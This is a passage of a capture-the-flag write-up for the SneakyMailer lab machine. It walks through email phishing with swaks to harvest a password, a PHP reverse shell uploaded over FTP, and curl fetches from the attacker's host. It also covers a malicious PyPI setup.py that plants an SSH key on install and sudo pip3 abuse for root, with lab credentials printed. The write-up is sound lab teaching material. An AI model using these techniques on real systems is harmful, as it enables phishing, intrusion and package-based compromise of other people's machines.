<p><img src="imgs/7f7b01dbdf744b97b9ccc3c260288ee1.png" alt="7f7b01dbdf744b97b9ccc3c260288ee1" style="zoom:67%;" /></p>
<p>Clicking on the &ldquo;Team&rdquo; menu points to<code>/team.php</code>. This page shows a table contains the employees' data of SneakyCorp.</p>
<p><img src="imgs/1a6090141fa446bd88cf25781913b8d5.png" alt="1a6090141fa446bd88cf25781913b8d5" style="zoom:67%;" /></p>
<p>I saved the whole table data and stored it in a file called <code>team</code>.</p>
<p><img src="imgs/c3c89ffbc8854cf1abf6ebece09b0197.png" alt="c3c89ffbc8854cf1abf6ebece09b0197" style="zoom:67%;" /></p>
<p>I can grab the emails using the <code>grep</code> and <code>tr</code> command as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ cat team <span class="p">|</span> egrep -o <span class="s2">&#34;[^[:space:]]+@[^[:space:]]+&#34;</span> <span class="p">|</span> tr -d <span class="s2">&#34;&lt;&gt;&#34;</span> <span class="p">|</span> tee emails.list
</code></pre></div><p><img src="imgs/612596863de94710b3a4ed80fd375133.png" alt="612596863de94710b3a4ed80fd375133" style="zoom:67%;" /></p>
<p>I ran <code>gobuster</code> but it didn&rsquo;t show any interesting results.</p>
<h3 id="tcp-8080--website">TCP 8080 —  Website</h3>
<p>It returns the default Nginx page.</p>
<h3 id="tcp-25--smtp-mail">TCP 25  —  SMTP (Mail)</h3>
<p>I tried to send an email, and it got queued.</p>
<p><img src="imgs/4b5e0238399640bd9b40a2810102ce39.png" alt="4b5e0238399640bd9b40a2810102ce39" style="zoom:67%;" /></p>
<p>Given a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.</p>
<h4 id="email-phishing">Email Phishing</h4>
<p>I&rsquo;ll setup <code>netcat</code> listener on port 80, and then I&rsquo;ll use a tool called <code>swaks</code> to send an email containing my IP address to all the email addresses I&rsquo;ve got.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ swaks --server <span class="s1">&#39;10.10.10.197&#39;</span> --to <span class="sb">`</span>cat emails.list <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span><span class="sb">`</span> --from admin@sneakymailer.htb --body <span class="s2">&#34;http://10.10.14.42/&#34;</span>
</code></pre></div><p>And there is an HTTP POST request coming to my listener.</p>
<p><img src="imgs/330df9a36349481fb8d7cef7660c535e.png" alt="330df9a36349481fb8d7cef7660c535e" style="zoom:67%;" /></p>
<p>The request body contains this data.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</span></code></pre></div><p>It can be decoded using an online url decoder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer.htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
</span></code></pre></div><p>The parameter <code>password</code> and <code>rpassword</code> seem juicy where the <strong>r</strong> might refer to reset or retype the password. Unfortunately, the password doesn&rsquo;t work on SSH and FTP.</p>
<h3 id="tcp-143---imap">TCP 143 - IMAP</h3>
<p>With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I&rsquo;ll need an email client, and I end up with <a href="https://sylpheed.sraoss.jp/en/">sylpheed</a>. You can install it with <code>sudo apt-get install sylpheed</code>.</p>
<p>But before moving on, I&rsquo;ll add <code>sneakymailer.htb</code> to my<code>/etc/hosts</code> file to avoid problems with dns/name resolution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.197 sneakymailer.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h4 id="initial-setup">Initial Setup</h4>
<p>As this is my first install, I&rsquo;ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on<code>/root/sneaky/loot/Mail</code>.</p>
<p><img src="imgs/336c2c9d596e4a86ba1ce454e912b2d9.png" alt="336c2c9d596e4a86ba1ce454e912b2d9" style="zoom:67%;" /></p>
<p>Next I&rsquo;ll have to determine the account type. Because the box only has IMAP listening and we&rsquo;re not going outside VPN connection, then I should choose IMAP4.</p>
<p><img src="imgs/aaa3354fe43a4564b1b13aec5c14a83c.png" alt="aaa3354fe43a4564b1b13aec5c14a83c" style="zoom:67%;" /></p>
<p>In the following section, I&rsquo;ll use the display name Paul and the email address <code>paulbyrd@sneakymailer.htb</code> that I obtained through phishing.</p>
<p><img src="imgs/3361aa3232224c8890c857f9e913becc.png" alt="3361aa3232224c8890c857f9e913becc" style="zoom:67%;" /></p>
<p>I lost some screenshots after the step above, but here is the final configuration.</p>
<p><img src="imgs/8ded1188afee41fd852d14e4943fc9b4.png" alt="8ded1188afee41fd852d14e4943fc9b4" style="zoom:67%;" /></p>
<p>Lastly, enter <code>paulbyrd</code>&rsquo;s password, <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.</p>
<h4 id="retrieving-the-emails">Retrieving the emails</h4>
<p>In Paul&rsquo;s mailbox, I found two emails inside the &ldquo;Sent Items&rdquo; folder.</p>
<p>The first email was sent with the subject of &ldquo;Password Reset&rdquo;. In this email, Paul asks the administrator to change the developer account password. I&rsquo;ll grab the credentials of the developer account.</p>
<p><img src="imgs/540344afea7f42debd7cdc36f3fadd32.png" alt="540344afea7f42debd7cdc36f3fadd32" style="zoom:67%;" /></p>
<p>The second email was sent with the subject &ldquo;Module testing&rdquo;, but right now I&rsquo;m not sure what it is about.</p>
<p><img src="imgs/f11b8bd4b2934eb892f681d23a369cdd-1619628769041.png" alt="f11b8bd4b2934eb892f681d23a369cdd" style="zoom:67%;" /></p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="ftp-access">FTP Access</h4>
<p>The developer account can be used to access the FTP server. There is only one directory called<code>/dev</code> in the FTP root directory.</p>
<p><img src="imgs/f761f7b9b264477ebae8d690c347cbef.png" alt="f761f7b9b264477ebae8d690c347cbef" style="zoom:67%;" /></p>
<p>I access the FTP server via browser. The files inside this FTP look the same files as the one hosted on <code>sneakycorp.htb</code>, except it has the additional word &ldquo;dev&rdquo; in the title.</p>
<p><img src="imgs/cea046ccdffc4e0f83620407c53726d5.png" alt="cea046ccdffc4e0f83620407c53726d5" style="zoom: 67%;" /></p>
<h4 id="reverse-shell-via-ftp-upload">Reverse Shell via FTP Upload</h4>
<p>It turns out that the developer account has write permission on the <code>/dev</code> directory, so I can drop a PHP reverse shell payload there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">211-FTP server status:
     Connected to ::ffff:10.10.14.20
     Logged in as developer
     TYPE: ASCII
     No session bandwidth limit
     Session timeout in seconds is <span class="m">300</span>
     Control connection is plain text
     Data connections will be plain text
     At session startup, client count was <span class="m">1</span>
     vsFTPd 3.0.3 - secure, fast, stable
ftp&gt; <span class="nb">cd</span> /dev
<span class="m">250</span> Directory successfully changed.
ftp&gt; put /shares/reversef.php iamf.php
local: /shares/reversef.php remote: iamf.php
<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
<span class="m">150</span> Ok to send data.
<span class="m">226</span> Transfer complete.
<span class="m">72</span> bytes sent in 0.00 secs <span class="o">(</span>2.8610 MB/s<span class="o">)</span>
</code></pre></div><p>At first I thought it was on <code>http://sneakycorp.htb/iamf.php</code>, the uploaded shell was available on <code>http://dev.sneakycorp.htb/iamf.php</code>, so I&rsquo;ll have to add <code>dev.sneakycorp.htb</code> to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.194&#39;</span> &gt;&gt; dev.sneakycorp.htb
</code></pre></div><p>Now I can trigger my web shell with curl.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ curl -s http://dev.sneakycorp.htb/iamf.php
</code></pre></div><p>The listener has an interactive shell now.</p>
<p><img src="imgs/43276abaf55b4760822901631d8c21de.png" alt="43276abaf55b4760822901631d8c21de" style="zoom:67%;" /></p>
<p>After gaining access to the box, I can re-enumerate and search for files containing sensitive data.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-low">Shell as low</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>/var/www</code>, I found another subdomain. The new is <code>pypi.sneakycorp.htb</code>, I&rsquo;ll add it to my <code>/etc/hosts</code> file.</p>
<p><img src="imgs/image-20210429003013735.png" alt="image-20210429003013735" style="zoom: 67%;" /></p>
<p>I discovered <code>.htpasswd</code> file inside <code>pypi.sneakycorp.htb</code>, which contains PyPI credentials.</p>
<p><img src="imgs/image-20210429003321320.png" alt="image-20210429003321320" style="zoom:67%;" /></p>
<p>I&rsquo;ll save <code>pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</code> to my note and send it to my Windows for cracking. In <code>/home</code> there is no user called <code>pypi</code>, so it might be used for something else.</p>
<h4 id="cracking-password">Cracking Password</h4>
<p>The password can be cracked easily with John the Ripper.</p>
<p><img src="imgs/image-20210429003613068.png" alt="image-20210429003613068" style="zoom:67%;" /></p>
<p>The password is <code>soufianeelhaoui</code></p>
<h4 id="malicious-pypi-package">Malicious PyPI package</h4>
<p>Looking into the web configuration file, <code>pypi.sneakycorp.htb</code> is accessible on <code>localhost:5000</code>.</p>
<p><img src="imgs/image-20210429005849918.png" alt="image-20210429005849918" style="zoom: 67%;" /></p>
<p>It is also accessible from remote on port 8080 if I specify the hostname, <code>pypi.sneakycorp.htb</code>.</p>
<p><img src="imgs/image-20210429005829551.png" alt="image-20210429005829551" style="zoom:67%;" /></p>
<p>Remember about the second email Paul sent to user law?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Hello low

Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.
</code></pre></div><p>Now the idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user <code>low</code> install the package (configured by the box&rsquo;s author automatically).</p>
<p>To create a package, I&rsquo;ll use the official site tutorial as my reference:</p>
<ul>
<li><a href="https://packaging.python.org/tutorials/packaging-projects/">https://packaging.python.org/tutorials/packaging-projects/</a></li>
<li>And you might want to read this too, <a href="https://packaging.python.org/specifications/pypirc/">https://packaging.python.org/specifications/pypirc/</a></li>
</ul>
<p>First, I&rsquo;ll get the <code>setup.py</code> template which looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">setuptools</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;README.md&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
    <span class="n">long_description</span> <span class="o">=</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">setuptools</span><span class="o">.</span><span class="n">setup</span><span class="p">(</span>
    <span class="n">name</span><span class="o">=</span><span class="s2">&#34;example-pkg-YOUR-USERNAME-HERE&#34;</span><span class="p">,</span> <span class="c1"># Replace with your own username</span>
    <span class="n">version</span><span class="o">=</span><span class="s2">&#34;0.0.1&#34;</span><span class="p">,</span>
    <span class="n">author</span><span class="o">=</span><span class="s2">&#34;Example Author&#34;</span><span class="p">,</span>
    <span class="n">author_email</span><span class="o">=</span><span class="s2">&#34;author@example.com&#34;</span><span class="p">,</span>
    <span class="n">description</span><span class="o">=</span><span class="s2">&#34;A small example package&#34;</span><span class="p">,</span>
    <span class="n">long_description</span><span class="o">=</span><span class="n">long_description</span><span class="p">,</span>
    <span class="n">long_description_content_type</span><span class="o">=</span><span class="s2">&#34;text/markdown&#34;</span><span class="p">,</span>
    <span class="n">url</span><span class="o">=</span><span class="s2">&#34;https://github.com/pypa/sampleproject&#34;</span><span class="p">,</span>
    <span class="n">project_urls</span><span class="o">=</span><span class="p">{</span>
        <span class="s2">&#34;Bug Tracker&#34;</span><span class="p">:</span> <span class="s2">&#34;https://github.com/pypa/sampleproject/issues&#34;</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="n">classifiers</span><span class="o">=</span><span class="p">[</span>
        <span class="s2">&#34;Programming Language :: Python :: 3&#34;</span><span class="p">,</span>
        <span class="s2">&#34;License :: OSI Approved :: MIT License&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Operating System :: OS Independent&#34;</span><span class="p">,</span>
    <span class="p">],</span>
    <span class="n">package_dir</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;&#34;</span><span class="p">:</span> <span class="s2">&#34;src&#34;</span><span class="p">},</span>
    <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="o">.</span><span class="n">find_packages</span><span class="p">(</span><span class="n">where</span><span class="o">=</span><span class="s2">&#34;src&#34;</span><span class="p">),</span>
    <span class="n">python_requires</span><span class="o">=</span><span class="s2">&#34;&gt;=3.6&#34;</span><span class="p">,</span>
<span class="p">)</span>
</code></pre></div><p>My goal is only to insert my SSH public key to <code>low</code>&rsquo;s authorized_keys, so I&rsquo;ll need to modify the code to this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">setuptools</span>
<span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/home/low/.ssh/authorized_keys&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd&#34;</span><span class="p">)</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">pass</span>
<span class="n">setuptools</span><span class="o">.</span><span class="n">setup</span><span class="p">(</span>
        <span class="n">name</span><span class="o">=</span><span class="s2">&#34;low&#34;</span><span class="p">,</span>
        <span class="n">version</span><span class="o">=</span><span class="s2">&#34;0.0.1&#34;</span><span class="p">,</span>
        <span class="n">author</span><span class="o">=</span><span class="s2">&#34;Example Author&#34;</span><span class="p">,</span>
        <span class="n">author_email</span><span class="o">=</span><span class="s2">&#34;author@example.com&#34;</span><span class="p">,</span>
        <span class="n">description</span><span class="o">=</span><span class="s2">&#34;A small example package&#34;</span><span class="p">,</span>
        <span class="n">long_description</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
        <span class="n">long_description_content_type</span><span class="o">=</span><span class="s2">&#34;text/markdown&#34;</span><span class="p">,</span>
     <span class="n">url</span><span class="o">=</span><span class="s2">&#34;https://github.com/pypa/sampleproject&#34;</span><span class="p">,</span>
     <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="o">.</span><span class="n">find_packages</span><span class="p">(),</span>
     <span class="n">classifiers</span><span class="o">=</span><span class="p">[</span>
        <span class="s2">&#34;Programming Language :: Python :: 3&#34;</span><span class="p">,</span>
        <span class="s2">&#34;License :: OSI Approved :: MIT License&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Operating System :: OS Independent&#34;</span><span class="p">,</span>
     <span class="p">],</span>
<span class="p">)</span>
</code></pre></div><p>From the link above, in order to upload a package to the PyPI server, a file called <code>.pypirc</code> must be present at <code>$HOME/.pypirc</code>.</p>
<p>The file is required for authentication, so I&rsquo;ll create one and put the PyPI credentials I obtained before.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-toml" data-lang="toml"><span class="p">[</span><span class="nx">distutils</span><span class="p">]</span>
<span class="nx">index-servers</span> <span class="p">=</span>
 <span class="nx">local</span>
 
<span class="p">[</span><span class="nx">local</span><span class="p">]</span>
<span class="nx">repository</span><span class="err">:</span> <span class="nx">http</span><span class="err">://</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">5000</span>
<span class="nx">username</span><span class="err">:</span> <span class="nx">pypi</span>
<span class="nx">password</span><span class="err">:</span> <span class="nx">soufianeelhaoui</span>
</code></pre></div><p>If I wanted to upload remotely, my <code>.pypirc</code> would look like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-toml" data-lang="toml"><span class="p">[</span><span class="nx">distutils</span><span class="p">]</span>
<span class="nx">index-servers</span> <span class="p">=</span>
 <span class="nx">remote</span>
 
<span class="p">[</span><span class="nx">remote</span><span class="p">]</span>
<span class="nx">repository</span><span class="err">:</span> <span class="nx">http</span><span class="err">://</span><span class="nx">pypi</span><span class="p">.</span><span class="nx">sneakycorp</span><span class="p">.</span><span class="nx">htb</span><span class="err">:</span><span class="mi">8080</span>
<span class="nx">username</span><span class="err">:</span> <span class="nx">pypi</span>
<span class="nx">password</span><span class="err">:</span> <span class="nx">soufianeelhaoui</span>
</code></pre></div><p>I&rsquo;ll transfer <code>setup.py</code> and <code>.pypirc</code> to <code>/dev/shm</code> of SneakyMailer via Python http server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «exploits» «10.10.14.42» 
$ python3 -m http.server <span class="m">80</span>
Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.197 - - <span class="o">[</span>12/Jul/2020  08:24:12<span class="o">]</span> <span class="s2">&#34;GET /.pypirc HTTP/1.1&#34;</span> <span class="m">200</span> -
10.10.10.197 - - <span class="o">[</span>12/Jul/2020  08:24:29<span class="o">]</span> <span class="s2">&#34;GET /setup.py HTTP/1.1&#34;</span> <span class="m">200</span> -
</code></pre></div><p>On SneakyMailer:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc &gt; .pypirc
www-data@sneakymailer:/dev/shm$ 
www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py &gt; setup.py
</code></pre></div><p>Now at <code>/dev/shm</code>, the folder structure looks like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">.
├── .pypirc
├── iamf.php
└── setup.py
</code></pre></div><p>The last part is set <code>$HOME</code> to <code>/dev/shm</code>, because <code>.pypirc</code> should be placed at <code>$HOME/.pypirc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ <span class="nb">export</span> <span class="nv">$HOME</span><span class="o">=</span>/dev/shm
www-data@sneakymailer:~$
</code></pre></div><p>After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@sneakymailer:~$ python3 setup.py sdist upload -r <span class="nb">local</span>
running sdist
running egg_info
writing low.egg-info/PKG-INFO
writing dependency_links to low.egg-info/dependency_links.txt
writing top-level names to low.egg-info/top_level.txt
reading manifest file <span class="s1">&#39;low.egg-info/SOURCES.txt&#39;</span>
writing manifest file <span class="s1">&#39;low.egg-info/SOURCES.txt&#39;</span>
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
running check
creating low-0.0.1
creating low-0.0.1/low.egg-info
copying files to low-0.0.1…
copying setup.py -&gt; low-0.0.1
copying low.egg-info/PKG-INFO -&gt; low-0.0.1/low.egg-info
copying low.egg-info/SOURCES.txt -&gt; low-0.0.1/low.egg-info
copying low.egg-info/dependency_links.txt -&gt; low-0.0.1/low.egg-info
copying low.egg-info/top_level.txt -&gt; low-0.0.1/low.egg-info
Writing low-0.0.1/setup.cfg
Creating tar archive
removing <span class="s1">&#39;low-0.0.1&#39;</span> <span class="o">(</span>and everything under it<span class="o">)</span>
running upload
Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
Server response <span class="o">(</span>200<span class="o">)</span>: OK
WARNING: Uploading via this <span class="nb">command</span> is deprecated, use twine to upload instead <span class="o">(</span>https://pypi.org/p/twine/<span class="o">)</span>
</code></pre></div><p>As long as I see the server response is 200, that means I have successfully uploaded the package.</p>
<h4 id="ssh-access">SSH Access</h4>
<p>Now I can login with my private key as user <code>low</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ ssh -i id_ecdsa low@10.10.10.197
</code></pre></div><p><img src="imgs/image-20210429021145269.png" alt="image-20210429021145269" style="zoom:67%;" /></p>
<p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-sudo-pip">Abusing sudo pip</h4>
<p>User <code>low</code> has sudo privileges on <code>/usr/bin/pip3</code>.</p>
<p><img src="imgs/image-20210429021533891.png" alt="image-20210429021533891" style="zoom: 67%;" /></p>
<p>I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/pip/">GTFOBins</a> to abuse this circumstance to obtain the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">low@sneakymailer:~$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
low@sneakymailer:~$
low@sneakymailer:~$ <span class="nb">echo</span> <span class="s1">&#39;raise Exception(open(&#34;/root/root.txt&#34;).read())&#39;</span> &gt; <span class="nv">$TF</span>/setup.py
low@sneakymailer:~$
low@sneakymailer:~$ sudo pip3 install <span class="nv">$TF</span>
</code></pre></div><p><img src="imgs/image-20210429021914961.png" alt="image-20210429021914961" style="zoom:67%;" /></p>
<p>Or to get a shell as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$
low@sneakymailer:~$ echo &#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&#34; &gt; $TF/setup.py
low@sneakymailer:~$
low@sneakymailer:~$ sudo pip3 install $TF
sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.9ShSegy5bm
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
